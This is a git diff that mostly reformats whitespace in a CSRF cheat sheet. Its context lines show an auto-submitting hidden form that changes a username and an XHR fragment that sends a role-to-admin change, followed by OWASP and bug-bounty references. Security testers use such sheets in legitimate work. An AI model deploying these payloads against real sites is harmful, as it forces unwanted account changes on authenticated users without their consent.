@@ -2,18 +2,17 @@
 
 > Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
 
-
 ## Summary
 
 * [Methodology](#methodology)
 * [Payloads](#payloads)
-    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
-    * [HTML GET - No User Interaction)](#html-get---no-user-interaction)
-    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
-    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
-    * [JSON GET - Simple Request](#json-get---simple-request)
-    * [JSON POST - Simple Request](#json-post---simple-request)
-    * [JSON POST - Complex Request](#json-post---complex-request)
+  * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
+  * [HTML GET - No User Interaction)](#html-get---no-user-interaction)
+  * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)
+  * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)
+  * [JSON GET - Simple Request](#json-get---simple-request)
+  * [JSON POST - Simple Request](#json-post---simple-request)
+  * [JSON POST - Complex Request](#json-post---complex-request)
 * [References](#references)
 
 ## Tools
@@ -56,12 +55,11 @@ When you are logged in to a certain site, you typically have a session. The iden
  <input name="username" type="hidden" value="CSRFd" />
  <input type="submit" value="Submit Request" />
 </form>
- 
+
 <script>
  document.getElementById("autosubmit").submit();
 </script>
 ```
-
 
 ### JSON GET - Simple Request
 
@@ -100,12 +98,11 @@ xhr.send('{"role":admin}');
 </script>
 ```
 
-
 ## References
 
 - [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
 - [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
-- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/) 
+- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/)
 - [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
 - [Hacking PayPal Accounts with one click (Patched) - Yasser Ali](http://yasserali.com/hacking-paypal-accounts-with-one-click/)
 - [Add tweet to collection CSRF - vijay kumar](https://hackerone.com/reports/100820)
